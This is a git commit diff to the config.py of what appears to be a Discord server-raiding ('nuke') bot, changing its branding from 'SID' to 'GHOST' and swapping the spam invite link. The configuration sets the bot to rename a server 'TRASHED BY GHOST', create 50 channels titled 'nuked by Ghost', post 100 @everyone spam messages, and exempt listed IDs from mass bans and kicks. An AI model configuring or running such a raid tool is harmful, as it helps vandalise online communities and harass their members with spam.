47d10fee19ce28068cff991ac21d1fd6fcae6516
Sidharth <128839129+BAHUBALISID@users.noreply.github.com>
2024-08-19 16:32:13 +0530

    Update config.py

--- config.py
+++ config.py
@@ -1,6 +1,6 @@
 EMBED_CONFIG = {
-    "title": "SID HERE",    # Maine Embed Title here 
-    "description": "DADDY SID",   # Main Embed Description here 
+    "title": "GHOST HERE",    # Maine Embed Title here 
+    "description": "DADDY GHOST",   # Main Embed Description here 
     "color": 000000,   # Change embed color if you want (red)
     "fields": [
         {"name": "test", "value": "test", "inline": False},    # Embed Field → Juste Modify → Just edit the empty places
@@ -12,22 +12,22 @@ EMBED_CONFIG = {
 }
 
 SERVER_CONFIG = {
-    "new_name": "TRASHED BY DHOLAKPUR",  # New Server Name here 
+    "new_name": "TRASHED BY GHOST",  # New Server Name here 
     "new_icon": "https://images-ext-1.discordapp.net/external/W0YRxLPLoVwkIOZTSLsalqrmW895TI77ao9nHW4wfx4/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1217116527308963901/a_a69a3d18d6dea267b5de7bfa7d007f17.gif",   # New Server Icon url here → https://image.jpg 
     "new_description": "TRASHED BY NEXTRA",  # New Server Description here 
 }
 
 WEBHOOK_CONFIG = {
-    "default_name": "SID",  # Webhook Name here 
+    "default_name": "GHOST",  # Webhook Name here 
 }
 
 
 AUTO_RAID_CONFIG = {
     'num_channels': 50,  # Number of channels
     'channel_type': 'text',  # text/voice
-    'channel_name': 'nuked by sid',  # Channel name
+    'channel_name': 'nuked by Ghost',  # Channel name
     'num_messages': 100,  # Number of message to spam
-    'message_content': '@everyone https://discord.gg/u872zDpf6V' # Spam Message
+    'message_content': '@everyone https://discord.gg/HKDRZzDufR' # Spam Message
 }
 
 NO_BAN_KICK_ID = {
@@ -37,6 +37,6 @@ NO_BAN_KICK_ID = {
 }
 
 BOT_PRESENCE = {
-    "type": "playing",  # "watching", "listening", or "watching"
-    "text": "sid"  # Your text presence
+    "type": "streaming",  # "watching", "listening", or "watching"
+    "text": "wake up"  # Your text presence
 }
